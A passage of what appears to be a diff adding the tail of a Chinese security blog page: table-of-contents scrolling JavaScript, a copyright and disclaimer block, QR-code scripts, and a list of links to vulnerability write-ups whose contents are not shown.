+                });
+                
+                // 滚动到目录项的可视区域
+                this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
+    
+
+          // 点击事件中
+          if (isMobile) {
+           closeToc(); // 移动端点击后关闭目录
+          }
+            
+                
+            }
+        });
+    });
+    
+    // 切换按钮点击事件
+    toggleButton.addEventListener('click', function() {
+        tocContainer.classList.add('active');
+     
+    });
+    
+    // 关闭按钮点击事件
+    closeButton.addEventListener('click', function(e) {
+        e.stopPropagation();
+        closeToc();
+    });
+    
+  
+    
+    // 滚动时更新高亮状态
+    window.addEventListener('scroll', function() {
+    
+    var fromTop = window.scrollY;
+    var header = document.querySelector("header");
+    var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
+    
+    
+     //console.log(headerHeight);
+    
+    
+    
+    // 精准计算标题文档位置
+    var activeSection = null;
+    headings.forEach(function(heading) {
+        var section = document.getElementById(heading.id);
+        if (!section) return;
+        
+        // 使用getBoundingClientRect获取精确位置
+        var rect = section.getBoundingClientRect();
+        var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
+        var sectionBottom = rect.bottom + fromTop + headerHeight;
+        
+        // 增加20px激活区域缓冲
+        if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
+            activeSection = heading;
+        }
+    });
+
+
+ 
+
+    // 更新高亮状态（新增精确边界判断）
+    if (activeSection) {
+        var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
+
+        if (tocLink && currentHighlight !== tocLink) {
+            if (currentHighlight) {
+            currentHighlight.blur();
+            currentHighlight.classList.remove('active');
+            }
+            
+            
+            tocLink.classList.add('active');
+           tocLink.focus();
+            currentHighlight = tocLink;
+            
+            // 平滑滚动到可视区域（改进触发条件）
+            var tocRect = tocLink.getBoundingClientRect();
+            var tocContainerRect = tocContainer.getBoundingClientRect();
+            if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
+                tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
+            }
+        }
+    }
+});
+    
+    // 关闭目录面板
+    function closeToc() {
+        tocContainer.classList.remove('active');
+      
+    }
+});
+ </script>
+ <style>
+  /* 超小屏幕隐藏 */
+    @media (max-width: 768px) {
+        #qrcode-right {
+            display: none;
+        }
+    }
+ </style>
+ <div class="copyright-plugin" style="padding:10px; font-size:14px; display:flex; justify-content: space-between; align-items: center;">
+  <div>
+   版权所有：
+   <a href="https://mrxn.net/">
+    Mrxn's Blog
+   </a>
+   <br/>
+   文章标题：
+   <a href="https://mrxn.net/jswz/57.html">
+    从暴风一号病毒源码里面找到的宝贝
+   </a>
+   <br/>
+   文章链接：
+   <a href="https://mrxn.net/jswz/57.html">
+    https://mrxn.net/jswz/57.html
+   </a>
+   <br/>
+   本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。
+  </div>
+  <!-- 右侧二维码 -->
+  <div id="qrcode-right">
+   <div id="copyright-qrcode">
+   </div>
+   <div style="text-align: center;font-size:12px;">
+    设备上扫码阅读
+   </div>
+  </div>
+  <script src="https://mrxn.net/content/plugins/log_posts/assets/qrcode.min.js">
+  </script>
+  <script>
+   var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
+        text: encodeURI("https://mrxn.net/jswz/57.html"),
+        width: 100,
+        height: 100,
+        colorDark: "#000000",
+        colorLight: "#ffffff",
+        correctLevel: QRCode.CorrectLevel.H
+    });
+  </script>
+ </div>
+ <div class="posts_related">
+  <h3>
+   📚 推荐阅读
+  </h3>
+  <ul>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html">
+     深信服运维安全管理系统 install_patch 远程命令执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html">
+     深信服运维安全管理系统 del_patch 远程命令执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html">
+     深信服运维安全管理系统 upload_file 远程命令执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html">
+     深信服运维安全管理系统 csspost/update 远程命令执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html">
+     深信服运维安全管理系统 save_SNMP 远程命令执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html">
+     深信服运维安全管理系统 getLdap 远程命令执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html">
+     深信服运维安全管理系统 Jwt 密钥硬编码
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html">
+     深信服运维安全管理系统 del_route 远程命令执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html">
+     深信服运维安全管理系统 del_net 远程命令执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html">
+     深信服运维安全管理系统 change_net 远程命令执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html">
+     大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html">
+     九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html">
+     九佳易管理系统 Ajax_XT.ashx SQL 注入漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html">
+     大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/qinglong-auth-bypass-rce.html">
+     青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html">
+     九佳易管理系统 picHY.ashx SQL 注入漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/bigant-install-config-rce.html">
+     大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html">
+     东胜物流软件 MsChDuiController 多个SQL注入漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/bigant-Public-download.html">
+     大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞
+    </a>
+   </li>
+   <li>
+    <a href="https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html">
+     东胜物流软件 MsAnnounceController SQL注入漏洞
+    </a>
+   </li>
+  </ul>
+ </div>
+ <style>
+  /* 底部展示样式 */
+        .qrcode-bottom-box {
+            margin: 40px auto;
+            text-align: center;
+        }
+        .qrcode-title {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 0px;
+            font-weight: bold;
+            text-align: center;
+        }
+        .qrcode-bottom-box img {
+            display: inline-block;
+            padding: 10px;
+            background: #fff;
+            border-radius: 8px;
+            margin: 10px auto;
+        }
+
+/* 悬浮展示样式 */
+
+.qrcode-float {
+    position: fixed;
+    z-index: 9999;
+    background: rgba(255,255,255,0.98);
+    padding: 20px;
+    border-radius: 12px;
+    
+   
+}
+.qrcode-float:hover {
+           transform: scale(1.05);
+    }
+
+
+      
+   
+   /* 移动端适配 */
+    @media (max-width: 1440px) {
+        .qrcode-float {
+            right: 2%;
+            transform: none;
+        }
+    }
+    
+    /* 超小屏幕隐藏 */
+    @media (max-width: 768px) {
+        .qrcode-float {
+            display: none;
+        }
+    }
+ </style>
+ <div class="qrcode-float">
+  <div id="posts-qrcode">
+  </div>
+  <div class="qrcode-title" style="font-size: 12px;">
+   手机扫码阅读
+  </div>
+ </div>
+ <script src="https://mrxn.net/content/plugins/log_posts/assets/qrcode.min.js">
+ </script>
+ <script>
+  var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
+        text: encodeURI("https://mrxn.net/jswz/57.html"),
+        width: 100,
+        height: 100,
+        colorDark: "#000000",
+        colorLight: "#ffffff",
+        correctLevel: QRCode.CorrectLevel.H
+    });
+ </script>
+</article>
